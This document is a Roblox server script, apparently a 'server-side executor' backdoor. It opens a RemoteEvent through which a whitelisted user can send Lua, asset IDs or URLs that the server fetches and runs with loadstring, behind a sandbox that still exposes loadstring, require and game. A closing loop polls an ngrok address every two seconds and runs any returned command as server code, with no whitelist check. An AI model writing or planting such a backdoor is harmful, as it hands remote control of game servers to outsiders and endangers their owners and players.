-- ============================================================
--  own ss - Server Bridge
--  Place as a Script in ServerScriptService
-- ============================================================

local RunService        = game:GetService("RunService")
local HttpService       = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players           = game:GetService("Players")

if RunService:IsClient() then
    error("[Bridge] Server only!")
end

-- ============================================================
-- CONFIG
-- !! Replace with your real UserId !!
-- Find it in Studio command bar:
-- print(game.Players:GetUserIdFromNameAsync("YourUsername"))
-- ============================================================

local WHITELIST = {
    [10149136525] = true,
}

local RATE_LIMIT_MAX    = 8
local RATE_LIMIT_WINDOW = 4
local MAX_PAYLOAD       = 200000
local MAX_CACHE         = 50

-- ============================================================
-- REMOTE SETUP
-- ============================================================

local Remote = ReplicatedStorage:FindFirstChild("MangoRemote")
if not Remote then
    Remote = Instance.new("RemoteEvent")
    Remote.Name   = "MangoRemote"
    Remote.Parent = ReplicatedStorage
end

local moduleCache      = {}
local moduleCacheOrder = {}
local cacheSize        = 0
local rateLimiter      = {}
local BASE_ENV         = getfenv(1)

Players.PlayerRemoving:Connect(function(p)
    rateLimiter[p.UserId] = nil
end)

-- ============================================================
-- HELPERS
-- ============================================================

local function log(m) print("[Bridge] " .. tostring(m)) end
local function err(m) warn("[Bridge] "  .. tostring(m)) end

local function isWhitelisted(player)
    return WHITELIST[player.UserId] == true
end

local function isRateLimited(player)
    local now = tick()
    local uid = player.UserId
    local d   = rateLimiter[uid]
    if not d then
        rateLimiter[uid] = {count = 1, t = now}
        return false
    end
    if now - d.t > RATE_LIMIT_WINDOW then
        rateLimiter[uid] = {count = 1, t = now}
        return false
    end
    d.count = d.count + 1
    return d.count > RATE_LIMIT_MAX
end

-- ============================================================
-- HTTP FETCH
-- Replaces game:HttpGet on the server side
-- ============================================================

local function serverFetch(url)
    if type(url) ~= "string" or not url:match("^https?://") then
        err("Invalid URL: " .. tostring(url))
        return nil
    end
    log("Fetching: " .. url)
    local ok, body = pcall(function()
        return HttpService:GetAsync(url, true)
    end)
    if not ok then
        err("HTTP failed: " .. tostring(body))
        return nil
    end
    if type(body) ~= "string" or #body == 0 then
        err("Empty HTTP response")
        return nil
    end
    if #body > MAX_PAYLOAD then
        err("Response too large: " .. #body .. " bytes")
        return nil
    end
    log("Fetched " .. #body .. " bytes OK")
    return body
end

-- ============================================================
-- SANDBOX
-- ============================================================

local function buildSandbox(player)
    local env = setmetatable({}, {__index = BASE_ENV})
    env.print        = print
    env.warn         = warn
    env.error        = error
    env.assert       = assert
    env.pcall        = pcall
    env.xpcall       = xpcall
    env.type         = type
    env.tostring     = tostring
    env.tonumber     = tonumber
    env.pairs        = pairs
    env.ipairs       = ipairs
    env.next         = next
    env.select       = select
    env.unpack       = unpack or table.unpack
    env.rawget       = rawget
    env.rawset       = rawset
    env.rawequal     = rawequal
    env.setmetatable = setmetatable
    env.getmetatable = getmetatable
    env.math         = math
    env.string       = string
    env.table        = table
    env.tick         = tick
    env.task         = task
    env.wait         = task.wait
    env.workspace    = workspace
    env.Players      = Players
    env.Instance     = Instance
    env.Color3       = Color3
    env.Vector3      = Vector3
    env.Vector2      = Vector2
    env.UDim2        = UDim2
    env.UDim         = UDim
    env.CFrame       = CFrame
    env.Enum         = Enum
    env.BrickColor   = BrickColor
    env.TweenInfo    = TweenInfo
    env.require      = require
    env.loadstring   = loadstring
    env.player       = player

    -- Proxy game so HttpGet works server side
    env.game = setmetatable({}, {
        __index = function(_, k)
            if k == "HttpGet" then
                return function(_, url)
                    return serverFetch(url) or ""
                end
            end
            return game[k]
        end,
        __newindex = function(_, k, v) game[k] = v end,
        __call    = function(_, ...) return game(...) end,
    })
    return env
end

-- ============================================================
-- EXECUTION ENGINE
-- ============================================================

local function execCode(code, player)
    if type(code) ~= "string" or #code == 0 then
        err("execCode: empty code")
        return
    end
    log("Compiling " .. #code .. " bytes...")
    local fn, compileErr = loadstring(code)
    if not fn then
        err("Compile error: " .. tostring(compileErr))
        return
    end
    local sandbox = buildSandbox(player)
    setfenv(fn, sandbox)
    local ok, runtimeErr = pcall(fn)
    if not ok then
        err("Runtime error: " .. tostring(runtimeErr))
    else
        log("Executed successfully")
    end
end

-- ============================================================
-- MODULE CALLER
-- ============================================================

local function callModule(mod, player, extraArg)
    if type(mod) == "function" then
        if extraArg then
            local ok = pcall(mod, extraArg)
            if not ok then
                local ok2 = pcall(mod, player)
                if not ok2 then pcall(mod) end
            end
        else
            local ok = pcall(mod, player)
            if not ok then
                local ok2 = pcall(mod, player.Name)
                if not ok2 then pcall(mod) end
            end
        end

    elseif type(mod) == "table" then
        local methods = {
            "init","run","execute","load",
            "start","Begin","Start","Main","main"
        }
        for _, key in ipairs(methods) do
            if type(mod[key]) == "function" then
                log("Calling table method: " .. key)
                pcall(mod[key], mod, extraArg or player)
                return
            end
        end
        pcall(function() mod(extraArg or player) end)

    elseif type(mod) == "string" then
        execCode(mod, player)

    else
        err("Module returned unsupported type: " .. type(mod))
    end
end

-- ============================================================
-- REQUIRE HANDLER
-- ============================================================

local function handleRequire(player, idStr, extraArg)
    local assetId = tonumber(idStr)
    if not assetId then
        err("Invalid asset ID: " .. tostring(idStr))
        return
    end
    log("require(" .. assetId .. ") for " .. player.Name)

    if moduleCache[assetId] then
        log("Using cached module: " .. assetId)
        callModule(moduleCache[assetId], player, extraArg)
        return
    end

    local ok, result = pcall(require, assetId)
    if not ok then
        err("require(" .. assetId .. ") failed: " .. tostring(result))
        return
    end

    if cacheSize >= MAX_CACHE then
        local oldest = table.remove(moduleCacheOrder, 1)
        if oldest then
            moduleCache[oldest] = nil
            cacheSize = cacheSize - 1
        end
    end

    moduleCache[assetId] = result
    table.insert(moduleCacheOrder, assetId)
    cacheSize = cacheSize + 1
    log("Module " .. assetId .. " cached (type=" .. type(result) .. ")")
    callModule(result, player, extraArg)
end

-- ============================================================
-- PATTERN PARSER
-- Detects script type and routes it correctly
-- ============================================================

local function parseAndExecute(player, text)
    text = text:match("^%s*(.-)%s*$")
    if text == "" then
        err("Empty input from " .. player.Name)
        return
    end
    log("Parsing " .. #text .. " bytes from " .. player.Name)

    -- PATTERN 1: loadstring(game:HttpGet("url"))()
    do
        local url = text:match('loadstring%s*%(%s*game%s*[.:]%s*HttpGet%s*%(%s*"(.-)"%s*[,%)]')
                 or text:match("loadstring%s*%(%s*game%s*[.:]%s*HttpGet%s*%(%s*'(.-)'%s*[,%)]")
                 or text:match('loadstring%s*%(%s*game%s*:%s*HttpGet%s*%(%s*"(.-)"%s*')
                 or text:match("loadstring%s*%(%s*game%s*:%s*HttpGet%s*%(%s*'(.-)'%s*")
        if url then
            log("Pattern 1: loadstring(HttpGet) -> " .. url)
            local code = serverFetch(url)
            if code then execCode(code, player) end
            return
        end
    end

    -- PATTERN 2: require(id)("arg") or require(id)('arg')
    do
        local id, arg = text:match('^%s*require%s*%((%d+)%)%s*%((.-)%)%s*$')
        if id then
            local clean = arg:match("^%s*[\"']?(.-)%s*[\"']?%s*$") or arg
            log("Pattern 2: require(" .. id .. ")(" .. clean .. ")")
            handleRequire(player, id, clean)
            return
        end
    end

    -- PATTERN 3: require(id) no args
    do
        local id = text:match('^%s*require%s*%((%d+)%)%s*$')
        if id then
            log("Pattern 3: require(" .. id .. ")")
            handleRequire(player, id, nil)
            return
        end
    end

    -- PATTERN 4: require(0xHEX):Method("a", "b")
    do
        local hexId, method, args = text:match('require%s*%(0x([%x]+)%)%s*:(%w+)%((.-)%)')
        if hexId then
            log("Pattern 4: require(0x" .. hexId .. "):" .. method)
            local assetId = tonumber("0x" .. hexId)
            if not assetId then err("Bad hex ID: 0x" .. hexId) return end
            local ok, mod = pcall(require, assetId)
            if not ok then err("require failed: " .. tostring(mod)) return end
            if type(mod) == "table" and type(mod[method]) == "function" then
                local parsedArgs = {}
                for a in args:gmatch('["\']([^"\']-)["\']') do
                    table.insert(parsedArgs, a)
                end
                if #parsedArgs == 0 then
                    for a in args:gmatch('([^,]+)') do
                        table.insert(parsedArgs, a:match("^%s*(.-)%s*$"))
                    end
                end
                pcall(mod[method], mod, table.unpack(parsedArgs))
            else
                err("No method '" .. method .. "' on module")
            end
            return
        end

        -- PATTERN 4b: require(decimalId):Method("a", "b")
        local decId, method2, args2 = text:match('require%s*%((%d+)%)%s*:(%w+)%((.-)%)')
        if decId then
            log("Pattern 4b: require(" .. decId .. "):" .. method2)
            local assetId = tonumber(decId)
            local ok, mod = pcall(require, assetId)
            if not ok then err("require failed: " .. tostring(mod)) return end
            if type(mod) == "table" and type(mod[method2]) == "function" then
                local parsedArgs = {}
                for a in args2:gmatch('["\']([^"\']-)["\']') do
                    table.insert(parsedArgs, a)
                end
                if #parsedArgs == 0 then
                    for a in args2:gmatch('([^,]+)') do
                        table.insert(parsedArgs, a:match("^%s*(.-)%s*$"))
                    end
                end
                pcall(mod[method2], mod, table.unpack(parsedArgs))
            else
                err("No method '" .. method2 .. "' on module")
            end
            return
        end
    end

    -- PATTERN 5: local id = 123 / local user = "x" block
    do
        local idVal   = text:match('local%s+id%s*=%s*(%d+)')
        local userVal = text:match('local%s+user%s*=%s*"(.-)"')
                     or text:match("local%s+user%s*=%s*'(.-)'")
        if idVal and userVal then
            log("Pattern 5: local id=" .. idVal .. " user=" .. userVal)
            handleRequire(player, idVal, userVal)
            return
        end
    end

    -- PATTERN 6: raw URL
    if text:match("^https?://") then
        log("Pattern 6: raw URL")
        local code = serverFetch(text)
        if code then execCode(code, player) end
        return
    end

    -- PATTERN 7: raw Lua fallback
    log("Pattern 7: raw Lua")
    execCode(text, player)
end

-- ============================================================
-- MAIN EVENT LISTENER
-- ============================================================

Remote.OnServerEvent:Connect(function(player, action, data)
    if type(action) ~= "string" then return end

    log("RECV <- " .. player.Name
        .. " [" .. player.UserId .. "]"
        .. " action=" .. action
        .. " data=" .. tostring(data):sub(1, 60))

    if not isWhitelisted(player) then
        err("BLOCKED (whitelist): " .. player.Name
            .. " userId=" .. player.UserId)
        return
    end

    if isRateLimited(player) then
        err("BLOCKED (rate limit): " .. player.Name)
        return
    end

    if action == "REQUIRE" then
        handleRequire(player, tostring(data), nil)

    elseif action == "LOADSTRING" then
        parseAndExecute(player, tostring(data))

    elseif action == "CLEARCACHE" then
        moduleCache      = {}
        moduleCacheOrder = {}
        cacheSize        = 0
        log("Cache cleared by " .. player.Name)

    else
        err("Unknown action: " .. action)
    end
end)

-- ============================================================
-- STARTUP
-- ============================================================

log("Bridge online. Whitelist: " .. (function()
    local t = {}
    for id in pairs(WHITELIST) do
        table.insert(t, tostring(id))
    end
    return table.concat(t, ", ")
end)())
-- ============================================================
-- WEB POLL LOOP (For Website Execution)
-- ============================================================
local API_URL = "https://subventionary-letha-boughten.ngrok-free.dev" -- Replace with your ngrok link

task.spawn(function()
    while task.wait(2) do -- Polls every 2 seconds
        local success, command = pcall(function()
            return HttpService:GetAsync(API_URL)
        end)
        
        if success and command and command ~= "none" then
            log("Web Command Received: " .. command:sub(1, 50))
            parseAndExecute(Players:GetPlayers()[1], command) -- Executes as the first player
        end
    end
end)
